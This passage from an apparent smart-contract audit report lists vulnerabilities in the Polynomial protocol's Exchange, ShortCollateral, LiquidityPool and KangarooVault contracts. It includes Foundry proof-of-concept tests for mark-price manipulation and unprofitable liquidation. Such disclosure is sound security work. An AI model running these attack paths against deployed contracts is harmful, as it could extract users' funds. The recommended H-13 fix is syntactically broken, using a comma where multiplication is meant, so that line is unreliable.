**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/103#issuecomment-1495743908)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/103#issuecomment-1532182114):**
 > The frontrunning part isn't an issue on Optimism, but the rest is valid.



***

## [[H-13] Exchange: `totalFunding` calculation should be done with a simple multiplication operation instead of a `wadMul` operation](https://github.com/code-423n4/2023-03-polynomial-findings/issues/101)
*Submitted by [carlitox477](https://github.com/code-423n4/2023-03-polynomial-findings/issues/101), also found by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/110)*

`wad` operations are meant to be done with int/uint which represent numbers with 18 decimals.

While the funding rate follows this representation, a simple time difference does not.

In `Exchange.getMarkPrice` as well as in `Exchange._updateFundingRate` a `wadMul` operation is done to multiply the funding rate per second by a simple time difference, leading to wrong calculation of `normalizationFactor` and mark price, affecting critical parts of the protocol.

### Proof of Concept

In `Exchange.getMarkPrice` first we get the funding rate per second:

```solidity
(int256 fundingRate,) = getFundingRate();
fundingRate = fundingRate / 1 days; // Funding rate per second
```

Immediately after, the total funding since last update is calculated:

```solidity
int256 currentTimeStamp = int256(block.timestamp);
        int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);

        // @audit funding rate X (time interval) / 1e18 = Number without decimal
        int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));
```

`int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));`<br>
is the same that<br>
$TOTAL\_ FUNDING\_{t\_{1}; t\_{2}} = \frac{FUNDING\_ RATE\_{sec} \times (t\_{2} - t\_{1})}{10^{18}}$

However, the division by $10^{18}$ should not happen, given that time difference does not represent a number with 18 decimals.

This ends up in a miscalculation of `totalFunding` variable, and as a consequence, a miscalculation of mark price.

The same issue happens in `_updateFundingRate` function.

### Impact

Here a complete list of functions affected by this bug:

1.  `Exchange.\_updateFundingRate` (`Exchange.sol#L416`)
    1.  `Exchange.openTrade` (`Exchange.sol#L95`)
    2.  `Exchange.closeTrade` (`Exchange.sol#L108`)
    3.  `Exchange.addCollateral` (`Exchange.sol#L121`)
    4.  `Exchange.removeCollateral` (`Exchange.sol#L134`)
    5.  `Exchange.liquidate` (`Exchange.sol#L147`)
2.  `Exchange.getMarkPrice` (`Exchange.sol#L196`):
    1.  `Exchange.\_addCollateral` (`Exchange.sol#L358`)
    2.  `Exchange.\_removeCollateral` (`Exchange.sol#L384`)
    3.  `KangarooVault.getTokenPrice` (`KangarooVault.sol#L353`)
    4.  `ShortCollateral.liquidate` (`ShortCollateral.sol#L133`)
    5.  `ShortCollateral.getMinCollateral` (`ShortCollateral.sol#L163`)
    6.  `ShortCollateral.canLiquidate` (`ShortCollateral.sol#L193`)
    7.  `ShortCollateral.maxLiquidatableDebt` (`ShortCollateral.sol#L216`)
    8.  `LiquidityPool.orderFee` (`LiquidityPool.sol#L388`)
    9.  `LiquidityPool.getMarkPrice` (`LiquidityPool.sol#L405`)
        1.  `LiquidityPool.getTokenPrice` (`LiquidityPool.sol#L352`)
        2.  `LiquidityPool.openLong` (`LiquidityPool.sol#L437`)
        3.  `LiquidityPool.closeLong`(`LiquidityPool.sol#L469`)
        4.  `LiquidityPool.openShort` (`LiquidityPool.sol#L501`)
        5.  `LiquidityPool.closeShort` (`LiquidityPool.sol#L533`)
        6.  `LiquidityPool.liquidate` (`LiquidityPool.sol#L558`)
        7.  `KangarooVault.removeCollateral` (`KangarooVault.sol#L437`)
        8.  `KangarooVault.\_openPosition` (`KangarooVault.sol#L568`)

As it can be seen, this bug affects multiple critical part of the protocol, calculating the correct mark price as well as updating the funding rate is essential for the protocol correct behavior.

### Recommended Mitigation steps

Simply replace current `wad` operation for a simple multiplication.

```diff
    function getMarkPrice() public view override returns (uint256 markPrice, bool isInvalid) {
        // Get base asset price from oracles
        (uint256 baseAssetPrice, bool invalid) = pool.baseAssetPrice();
        isInvalid = invalid;

        // Get funding rate per second
        // max 1% or 1e16
        (int256 fundingRate,) = getFundingRate();
        fundingRate = fundingRate / 1 days;

        int256 currentTimeStamp = int256(block.timestamp);
        int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);

-       int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));
+       int256 totalFunding = fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp);
        int256 normalizationUpdate = 1e18 - totalFunding;
        uint256 newNormalizationFactor = normalizationFactor.mulWadDown(uint256(normalizationUpdate));

        uint256 squarePrice = baseAssetPrice.mulDivDown(baseAssetPrice, PRICING_CONSTANT);
        markPrice = squarePrice.mulWadDown(newNormalizationFactor);
    }
```

```diff
    function _updateFundingRate() internal {
        (int256 fundingRate,) = getFundingRate();
        
        fundingRate = fundingRate / 1 days;

        int256 currentTimeStamp = int256(block.timestamp);
        int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);

-       int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));
+       int256 totalFunding = fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp);        

        int256 normalizationUpdate = 1e18 - totalFunding;

        normalizationFactor = normalizationFactor.mulWadDown(uint256(normalizationUpdate));
        
        emit UpdateFundingRate(fundingLastUpdated, normalizationFactor);
        fundingLastUpdated = block.timestamp;
    }
```

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/101#issuecomment-1495955712)**



***

## [[H-14] Inexpedient liquidatable logic that could have half liquidable position turns fully liquidable instantly](https://github.com/code-423n4/2023-03-polynomial-findings/issues/70)
*Submitted by [RaymondFam](https://github.com/code-423n4/2023-03-polynomial-findings/issues/70), also found by [Josiah](https://github.com/code-423n4/2023-03-polynomial-findings/issues/195)*

In ShortCollateral.sol, the slash logic of `maxLiquidatableDebt()` is specifically too harsh to the barely unhealthy positions because `maxDebt` will be half of the position to be liquidated if `0.95e18 <= safetyRatio <= 1e18`.

Additionally, once a position turns liquidatable, the position is deemed fully liquidatable atomically in two repeated transactions.

### Proof of Concept

Supposing we resort to the following setup as denoted in `ShortCollateral.t.sol` (`#L21-L23`):

collRatio = 1.5e18<br>
liqRatio = 1.3e18<br>
liqBonus = 1e17

Collateral ratio of a position, `x = (position.collateralAmount * collateralPrice) / (position.shortAmount * markPrice)`

File: `ShortCollateral.sol#L230-L239`
```solidity
        uint256 safetyRatioNumerator = position.collateralAmount.mulWadDown(collateralPrice);
        uint256 safetyRatioDenominator = position.shortAmount.mulWadDown(markPrice);
        safetyRatioDenominator = safetyRatioDenominator.mulWadDown(collateral.liqRatio);
        uint256 safetyRatio = safetyRatioNumerator.divWadDown(safetyRatioDenominator);

        if (safetyRatio > 1e18) return maxDebt;

        maxDebt = position.shortAmount / 2;

        if (safetyRatio < WIPEOUT_CUTOFF) maxDebt = position.shortAmount;
```

According to the code block above with `liqRatio` factored in:

In order to avoid being liquidated, a position will need to have a collateral ratio, `x > 1.3e18` so that `safetyRatio > (1.3 / 1.3)e18` which is `safetyRatio > 1e18`.

The position will be half liquidated if its associated collateral ratio falls in the range of `1.235e18 <= x <= 1.3e18`. To avoid full liquidation, the condition at the lower end will need to be `safetyRatio >= (1.235 / 1.3)e18` which is `safetyRatio >= 0.95e18`.

The position will be fully liquidated if `x < 1.235e18`.

Here is the unforgiving scenario:

1.  Bob has a short position whose collateral ratio happens to be 1.3e18.

2.  Bob's position gets half liquidated the first round ending up with a collateral ratio, x (Note: The numerator is multiplied by 0.45 because of the additional 10% `liqBonus` added to the one half collateral slashed:<br>
    `(1.3 * 0.45 / 0.5)e18 = 1.17e18`

3.  Immediately, Bob's position becomes fully liquidatable because `x < 1.235e18`.

### Recommended Mitigation Steps

Consider restructuring the slashing logic such that the position turns healthy after being partially liquidated, instead of making it spiral down to the drain.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/70#issuecomment-1481012637):**
 > Not a duplicate of https://github.com/code-423n4/2023-03-polynomial-findings/issues/146

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/70#issuecomment-1497529849)**

**[rivalq (Polynomial) confirmed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/70#issuecomment-1548109271):**
 > Depending upon the collateral and its collateral ratio etc, that spiral of liquidation may happen. 



***

 
# Medium Risk Findings (19)
## [[M-01] Exchange Rate can be manipulated if positions are big enough for a long enough time](https://github.com/code-423n4/2023-03-polynomial-findings/issues/263)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-03-polynomial-findings/issues/263)*

If exchangeRate can be maniupulated, then this can be used to extract value or grief withdrawals from the `KangarooVault`.

From my experimentation, the values to manipulate the share price are very high, making the attack fairly unlikely.

That said, by manipulating `markPrice` we can get maniupulate `getTokenPrice`, which will cause a leak of value in withdrawals.

This requires a fairly laborious setup (enough time has passed, from fairly thorough testing we need at least 1 week).<br>
And also requires a very high amount of capital (1 billion in the example, I think 100MLN works as well)

### Proof of Concept

Can be run via `forge test --match-test testFundingRateDoesChange -vvvvv`

After creating a new test file `TestExchangeAttack.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {console2} from "forge-std/console2.sol";

import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

import {TestSystem} from "./utils/TestSystem.sol";
import {Exchange} from "../src/Exchange.sol";
import {LiquidityPool} from "../src/LiquidityPool.sol";
import {PowerPerp} from "../src/PowerPerp.sol";
import {ShortToken} from "../src/ShortToken.sol";
import {ShortCollateral} from "../src/ShortCollateral.sol";
import {MockERC20Fail} from "../src/test-helpers/MockERC20Fail.sol";

contract TestExchangeAttack is TestSystem {
    using FixedPointMathLib for uint256;

    uint256 public constant initialPrice = 1200e18;

    Exchange private exchange;
    PowerPerp private powerPerp;
    ShortToken private shortToken;
    ShortCollateral private shortCollateral;
    MockERC20Fail private susd;

    LiquidityPool private pool;

    function setUp() public {
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();
        setAssetPrice(initialPrice);

        exchange = getExchange();
        powerPerp = getPowerPerp();
        shortToken = getShortToken();
        shortCollateral = getShortCollateral();
        susd = getSUSD();
        pool = getPool();
    }


    function testDeployment() public {
        exchange.refresh();
        _testDeployment();
    }

    event Debug(string name, uint256 value);

    function testFundingRateDoesChange() public {
        (uint256 price,) = exchange.getIndexPrice();
        (uint256 markPrice,) = exchange.getMarkPrice();
        (int256 fundingRate,) = exchange.getFundingRate();

        assertEq(fundingRate, 0);

        deposit(1e40, user_3);
        
        // 10e26 = 1 Billion
        openLong(1e26,  1e34, user_2);
        // openShort(1e20,  user_1);

        vm.warp(block.timestamp + 20 weeks);

        (int256 newFundingRate,) = exchange.getFundingRate();

        emit Debug("fundingRate", uint256(fundingRate));
        emit Debug("newFundingRate", uint256(newFundingRate));
        assertTrue(fundingRate != newFundingRate, "newFundingRate has not changed");

        (uint256 newMarkPrice,) = exchange.getMarkPrice();

        emit Debug("markPrice", markPrice);
        emit Debug("newMarkPrice", newMarkPrice);
        assertTrue(markPrice != newMarkPrice, "price has not changed");
    }

    function deposit(uint256 amount, address user) internal {
        susd.mint(user, amount);

        vm.startPrank(user);
        susd.approve(address(getPool()), amount);
        pool.deposit(amount, user);
        vm.stopPrank();
    }
    function openLong(uint256 amount, uint256 maxCost, address user) internal {
        susd.mint(user, maxCost);

        Exchange.TradeParams memory tradeParams;

        tradeParams.isLong = true;
        tradeParams.amount = amount;
        tradeParams.maxCost = maxCost;

        vm.startPrank(user);
        susd.approve(address(getPool()), maxCost);
        exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function closeLong(uint256 amount, uint256 minCost, address user) internal {
        require(powerPerp.balanceOf(user) == amount);

        Exchange.TradeParams memory tradeParams;

        tradeParams.isLong = true;
        tradeParams.amount = amount;
        tradeParams.minCost = minCost;

        vm.prank(user);
        exchange.closeTrade(tradeParams);
    }

    function openShort(uint256 amount, address user)
        internal
        returns (uint256 positionId, Exchange.TradeParams memory tradeParams)
    {

        uint256 collateral = shortCollateral.getMinCollateral(amount, address(susd));


        susd.mint(user, collateral);

        tradeParams.amount = amount;
        tradeParams.collateral = address(susd);
        tradeParams.collateralAmount = collateral;
        tradeParams.minCost = 0;


        vm.startPrank(user);
        susd.approve(address(exchange), collateral);
        (positionId,) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function openShort(uint256 positionId, uint256 amount, uint256 collateral, address user) internal {
        Exchange.TradeParams memory tradeParams;
        susd.mint(user, collateral);

        tradeParams.positionId = positionId;
        tradeParams.amount = amount;
        tradeParams.collateral = address(susd);
        tradeParams.collateralAmount = collateral;
        tradeParams.minCost = 0;

        vm.startPrank(user);
        susd.approve(address(exchange), collateral);
        (positionId,) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function closeShort(uint256 positionId, uint256 amount, uint256 maxCost, uint256 collAmt, address user)
        internal
        returns (Exchange.TradeParams memory tradeParams)
    {
        require(shortToken.ownerOf(positionId) == user);
        susd.mint(user, maxCost);

        (, uint256 shortAmount, uint256 collateralAmount, address collateral) = shortToken.shortPositions(positionId);

        tradeParams.amount = amount > shortAmount ? shortAmount : amount;
        tradeParams.collateral = collateral;
        tradeParams.collateralAmount = collAmt > collateralAmount ? collateralAmount : collAmt;
        tradeParams.maxCost = maxCost;
        tradeParams.positionId = positionId;

        vm.startPrank(user);
        susd.approve(address(getPool()), maxCost);
        exchange.closeTrade(tradeParams);
        vm.stopPrank();
    }
}
```

As you can see we can move the markPrice, which will impact the valuation of the KangarooShares during withdrawals

```javascript
    │   └─ ← 719999999999999999280, false
    ├─ emit Debug(name: markPrice, value: 720000000000000000000)
    ├─ emit Debug(name: newMarkPrice, value: 719999999999999999280)
    └─ ← ()
```

**[mubaris (Polynomial) disagreed with severity](https://github.com/code-423n4/2023-03-polynomial-findings/issues/263#issuecomment-1493765621)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/263#issuecomment-1500226967):**
 > Would like more input from the sponsor @mubaris on this one.
> 
> Going back to the definitions:<br>
> > QA (Quality Assurance) Includes both Non-critical (code style, clarity, syntax, versioning, off-chain monitoring (events, etc) and Low risk (e.g. assets are not at risk: state handling, function incorrect as to spec, issues with comments). Excludes Gas optimizations, which are submitted and judged separately.<br>
> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.<br>
> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
> 
> The attack path being an edge case on the assets that's valid but unlikely, I believe Medium Severity to still be right. Even if not "Sponsor Confirmed", this could be an acknowledged bug.

**[mubaris (Polynomial) confirmed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/263#issuecomment-1518535197):**
 > Medium severity seems fair.

**[Dravee (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-polynomial-findings/issues/263#issuecomment-1518717542)**



***

## [[M-02] Users can receive less collateral than expected from liquidations](https://github.com/code-423n4/2023-03-polynomial-findings/issues/236)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-03-polynomial-findings/issues/236), also found by [adriro](https://github.com/code-423n4/2023-03-polynomial-findings/issues/207), [bin2chen](https://github.com/code-423n4/2023-03-polynomial-findings/issues/143), [chaduke](https://github.com/code-423n4/2023-03-polynomial-findings/issues/66), and [csanuragjain](https://github.com/code-423n4/2023-03-polynomial-findings/issues/15)*

Users might receive very little or no collateral when liquidating extremely unhealthy short positions.

### Vulnerability Details

When users liquidate a short position, they expect to get a reasonable amount of collateral in return. The collateral amount sent to liquidators is handled by `liquidate()` in the `ShortCollateral` contract:

```solidity
totalCollateralReturned = liqBonus + collateralClaim;
if (totalCollateralReturned > userCollateral.amount) totalCollateralReturned = userCollateral.amount;
userCollateral.amount -= totalCollateralReturned;

ERC20(userCollateral.collateral).safeTransfer(user, totalCollateralReturned);
```

Where:

*   `liqBonus` - Bonus amount of collateral for liquidation.
*   `collateralClaim` - Collateral amount returned, proportional to the how much debt is being liquidated.

As seen from above, if the position does not have sufficient collateral to repay the short amount being liquidated, it simply repays the liquidator with the remaining collateral amount.

This could cause liquidators to receive less collateral than expected, especially if they fully liquidate positions with high short amount to collateral ratios. In extreme cases, if a user liquidates a position with a positive short amount and no collateral (known as bad debt), they would receive no collateral at all.

### Proof of Concept

The following test demonstrates how a user can liquidate a short position without getting any collateral in return:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {TestSystem, Exchange, ShortToken, ShortCollateral, MockERC20Fail} from "./utils/TestSystem.sol";

contract LiquidationOverpay is TestSystem {
    // Protocol contracts
    Exchange private exchange;
    ShortToken private shortToken;
    ShortCollateral private shortCollateral;

    // sUSD token contract
    MockERC20Fail private SUSD;

    // Intial base asset price
    uint256 private constant initialBaseAssetPrice = 1e18;

    function setUp() public {
        // Deploy contracts
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();

        exchange = getExchange();
        shortToken = getShortToken();
        shortCollateral = getShortCollateral();
        SUSD = getSUSD();

        // Set initial price for base asset
        setAssetPrice(initialBaseAssetPrice);

        // Mint sUSD for user_1
        SUSD.mint(user_1, 1e20);

        // Mint powerPerp for user_2 and user_3
        vm.startPrank(address(exchange));
        getPowerPerp().mint(user_2, 1e20);
        getPowerPerp().mint(user_3, 1e20);
        vm.stopPrank();
    }

    function testLiquidationReturnsLessCollateralThanExpected() public {
        // Open short position with amount = 1e18, collateral amount = 1e15 (sUSD)
        uint256 shortAmount = 1e18;
        uint256 positionId = openShort(1e18, 1e15, user_1);

        // Base asset price rises by 50%
        setAssetPrice(initialBaseAssetPrice * 150 / 100);

        // user_2 liquidates 85% USER's entire short position
        vm.prank(user_2);
        exchange.liquidate(positionId, shortAmount * 85 / 100);

        // positionId has no remaining collateral, but still has remaining 15% of debt
        (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingAmount, shortAmount * 15 / 100);
        assertEq(remainingCollateralAmount, 0);

        // user_3 liquidates the same position
        vm.prank(user_3);
        exchange.liquidate(positionId, shortAmount);
        
        // user_3 did not get any collateral
        assertEq(SUSD.balanceOf(user_3), 0);
    }

    function openShort(
        uint256 amount,
        uint256 collateralAmount,
        address user
    ) internal returns (uint256 positionId) {
        Exchange.TradeParams memory tradeParams;
        tradeParams.amount = amount;
        tradeParams.collateral = address(SUSD);
        tradeParams.collateralAmount = collateralAmount;

        vm.startPrank(user);
        SUSD.approve(address(exchange), collateralAmount);
        (positionId, ) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }
}
```

### Recommended Mitigation

In `liquidate()` of the `Exchange` contract, consider adding a `minCollateralAmount` parameter, which represents the minimum amount of collateral a liquidator is willing to receive. . If the returned collateral amount is less than `minCollateralAmount`, the transaction should revert.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/236#issuecomment-1482622719):**
 > Warden wrote:
> ```solidity
>         // Base asset price rises by 50%
>         setAssetPrice(initialBaseAssetPrice * 150 / 100);
> ```
> Base asset being sUSD, not sure how likely it is to rise by 50%. Crazy world though and fuzzed tests DO take into account such an increase:
> ```solidity
> File: Exchange.Simple.t.sol
> 188:     function testSimpleLongClosePriceDiffTrade(uint256 priceDiff) public {
> 189:         vm.assume(priceDiff > 1e17);
> 190:         vm.assume(priceDiff < 50e18);
> ...
> 196:         setAssetPrice(initialPrice + priceDiff);
> ```
> Seems valid.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/236#issuecomment-1497347283)**



***

## [[M-03] `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions do not use `whenNotPaused` modifier](https://github.com/code-423n4/2023-03-polynomial-findings/issues/232)
*Submitted by [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/232), also found by [DadeKuma](https://github.com/code-423n4/2023-03-polynomial-findings/issues/249), [CRYP70](https://github.com/code-423n4/2023-03-polynomial-findings/issues/244), [sakshamguruji](https://github.com/code-423n4/2023-03-polynomial-findings/issues/173), and [Diana](https://github.com/code-423n4/2023-03-polynomial-findings/issues/136)*

As shown by the code below, although `PauseModifier` is imported, the `KangarooVault` contract does not use the `whenNotPaused` modifier in any of its functions. More specifically, the `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions do not use the `whenNotPaused` modifier.

```solidity
import {PauseModifier} from "./utils/PauseModifier.sol";

contract KangarooVault is Auth, ReentrancyGuard, PauseModifier {
```

```solidity
    function initiateDeposit(address user, uint256 amount) external nonReentrant {
```

```solidity
    function processDepositQueue(uint256 idCount) external nonReentrant {
```

```solidity
    function initiateWithdrawal(address user, uint256 tokens) external nonReentrant {
```

```solidity
    function processWithdrawalQueue(uint256 idCount) external nonReentrant {
```

This is unlike the `LiquidityPool` contract; comparing to the `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions, the `LiquidityPool.deposit`, `LiquidityPool.queueDeposit`, `LiquidityPool.processDeposits`, `LiquidityPool.withdraw`, `LiquidityPool.queueWithdraw`, and `LiquidityPool.processWithdraws` functions have the similar functionalities but they all use the `whenNotPaused` modifier. As a result, when an emergency, such as a hack, occurs, the protocol can pause the `LiquidityPool.withdraw`, `LiquidityPool.queueWithdraw`, and `LiquidityPool.processWithdraws` functions to prevent or reduce damages, such as preventing users and the protocol from losing funds, but cannot do that for the `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions.

```solidity
    function deposit(uint256 amount, address user) external override nonReentrant whenNotPaused("POOL_DEPOSIT") {
```

```solidity
    function queueDeposit(uint256 amount, address user)
        external
        override
        nonReentrant
        whenNotPaused("POOL_QUEUE_DEPOSIT")
    {
```

```solidity
    function processDeposits(uint256 count) external override nonReentrant whenNotPaused("POOL_PROCESS_DEPOSITS") {
```

```solidity
    function withdraw(uint256 tokens, address user) external override nonReentrant whenNotPaused("POOL_WITHDRAW") {
```

```solidity
    function queueWithdraw(uint256 tokens, address user)
        external
        override
        nonReentrant
        whenNotPaused("POOL_QUEUE_WITHDRAW")
    {
```

```solidity
    function processWithdraws(uint256 count) external override nonReentrant whenNotPaused("POOL_PROCESS_WITHDRAWS") {
```

### Proof of Concept

The following steps can occur for the described scenario.

1.  An emergency, such as a hack, occurs in which further withdrawals can cause users and the protocol to lose funds.
2.  The protocol team is able to pause the `LiquidityPool.withdraw`, `LiquidityPool.queueWithdraw`, and `LiquidityPool.processWithdraws` functions.
3.  However, the protocol team is unable to pause the `KangarooVault.initiateWithdrawal` and `KangarooVault.processWithdrawalQueue` functions.
4.  As a result, funds can be lost from the `KangarooVault`.

### Tools Used

VSCode

### Recommended Mitigation Steps

The `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions can be updated to use the `whenNotPaused` modifier.

**[rivalq (Polynomial) disagreed with severity](https://github.com/code-423n4/2023-03-polynomial-findings/issues/232#issuecomment-1495772382)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/232#issuecomment-1499789604):**
 > > rivalq (Polynomial) disagreed with severity
> 
> Not such an easy one to grade. Historically, missing `whenNotPaused` modifiers are considered as a medium risk issue: 
> - https://github.com/code-423n4/2022-06-connext-findings/issues/175
> - https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/38
> 
> The only time they are considered as Low severity findings are when they're actually put on too many functions and should be removed:
> - https://code4rena.com/reports/2022-02-jpyc#l-04-fiattokenv1--v2-remove-whennotpaused-modifier-from-cancelauthorization-and-decreaseallowance-functions
> - https://code4rena.com/reports/2023-01-drips#l-04-collecting-funds-should-be-usable-while-the-dripshub-contract-is-paused
> 
> Therefore I believe that Medium Severity is the right risk level, at least for this type of issue on code4rena and for the time being

**[mubaris (Polynomial) confirmed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/232#issuecomment-1518535320):**
 > Medium severity seems fair.



***

## [[M-04] `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions should execute `require(!isInvalid && spotPrice > 0)` instead of `require(!isInvalid || spotPrice > 0)`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/221)
*Submitted by [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/221), also found by [juancito](https://github.com/code-423n4/2023-03-polynomial-findings/issues/260), [peakbolt](https://github.com/code-423n4/2023-03-polynomial-findings/issues/155), and [chaduke](https://github.com/code-423n4/2023-03-polynomial-findings/issues/24)*

The following `KangarooVault.transferPerpMargin` and `KangarooVault._openPosition` functions execute `require(!isInvalid && baseAssetPrice != 0)`, where `isInvalid` and `baseAssetPrice` are returned from calling `LIQUIDITY_POOL.baseAssetPrice()`. Because `LIQUIDITY_POOL.baseAssetPrice()` returns the return values of `perpMarket.assetPrice()`, the `KangarooVault.transferPerpMargin` and `KangarooVault._openPosition` functions would only consider `perpMarket.assetPrice()` as reliable when both `!isInvalid` and `baseAssetPrice != 0` are true.

```solidity
    function transferPerpMargin(int256 marginDelta) external requiresAuth nonReentrant {
        if (marginDelta < 0) {
            ...
            (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();
            require(!isInvalid && baseAssetPrice != 0);
            ...
        } else {
            ...
        }
        ...
    }
```

```solidity
    function _openPosition(uint256 amt, uint256 minCost) internal {
        ...
        (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();
        require(!isInvalid && baseAssetPrice != 0);
        ...
    }
```

However, the following `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions execute `require(!isInvalid || spotPrice > 0)` and would consider `perpMarket.assetPrice()` as reliable when either `!isInvalid` or `spotPrice > 0` is true. When `perpMarket.assetPrice()` returns a positive `spotPrice` and a true `isInvalid`, such `spotPrice` should be considered as invalid and untrusted; trades, such as these for opening and closing long and short positions using the `LiquidityPool`, that depend on the `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions' return values, which then rely on such invalid `spotPrice`, should not be allowed. However, because `!isInvalid || spotPrice > 0` is true in this case, calling the `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions will not revert, and such trades that should not be allowed can still be made.

```solidity
    function _getDelta() internal view returns (uint256 delta) {
        (uint256 spotPrice, bool isInvalid) = baseAssetPrice();
        uint256 pricingConstant = exchange.PRICING_CONSTANT();

        require(!isInvalid || spotPrice > 0);

        delta = spotPrice.mulDivDown(2e18, pricingConstant);
        delta = delta.mulWadDown(exchange.normalizationFactor());
    }
```

```solidity
    function _calculateMargin(int256 size) internal view returns (uint256 margin) {
        (uint256 spotPrice, bool isInvalid) = baseAssetPrice();

        require(!isInvalid || spotPrice > 0);

        uint256 absSize = size.abs();
        margin = absSize.mulDivDown(spotPrice, futuresLeverage);
    }
```

```solidity
    function baseAssetPrice() public view override returns (uint256 spotPrice, bool isInvalid) {
        (spotPrice, isInvalid) = perpMarket.assetPrice();
    }
```

### Proof of Concept

The following steps can occur for the described scenario.

1.  Calling the `perpMarket.assetPrice` function returns a positive `spotPrice` and a true `isInvalid` at this moment.
2.  Calling the `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions would not revert because `require(!isInvalid || spotPrice > 0)` would be passed.
3.  Trades, such as for closing a long position through calling the `LiquidityPool.closeLong` function, can go through even though the used `spotPrice` is invalid and untrusted.
4.  In this case, such trades should not be allowed but are still made.

### Tools Used

VSCode

### Recommended Mitigation Steps

The `LiquidityPool._getDelta` and `LiquidityPool._calculateMargin` functions can be updated to execute `require(!isInvalid && spotPrice > 0)` instead of `require(!isInvalid || spotPrice > 0)`.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/221#issuecomment-1497320822)**



***

## [[M-05] Some functions that call `Exchange.getMarkPrice` function do not check if `Exchange.getMarkPrice` function's returned `markPrice` is 0](https://github.com/code-423n4/2023-03-polynomial-findings/issues/220)
*Submitted by [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/220)*

The following `Exchange.getMarkPrice` function uses `pool.baseAssetPrice()`'s returned `baseAssetPrice`, which is `spotPrice` returned by `perpMarket.assetPrice()`, to calculate and return the `markPrice`. When such `spotPrice` is 0, this function would return a 0 `markPrice`.

```solidity
    function getMarkPrice() public view override returns (uint256 markPrice, bool isInvalid) {
        (uint256 baseAssetPrice, bool invalid) = pool.baseAssetPrice();
        isInvalid = invalid;

        (int256 fundingRate,) = getFundingRate();
        fundingRate = fundingRate / 1 days;

        int256 currentTimeStamp = int256(block.timestamp);
        int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);

        int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));
        int256 normalizationUpdate = 1e18 - totalFunding;
        uint256 newNormalizationFactor = normalizationFactor.mulWadDown(uint256(normalizationUpdate));

        uint256 squarePrice = baseAssetPrice.mulDivDown(baseAssetPrice, PRICING_CONSTANT);
        markPrice = squarePrice.mulWadDown(newNormalizationFactor);
    }
```

```solidity
    function baseAssetPrice() public view override returns (uint256 spotPrice, bool isInvalid) {
        (spotPrice, isInvalid) = perpMarket.assetPrice();
    }
```

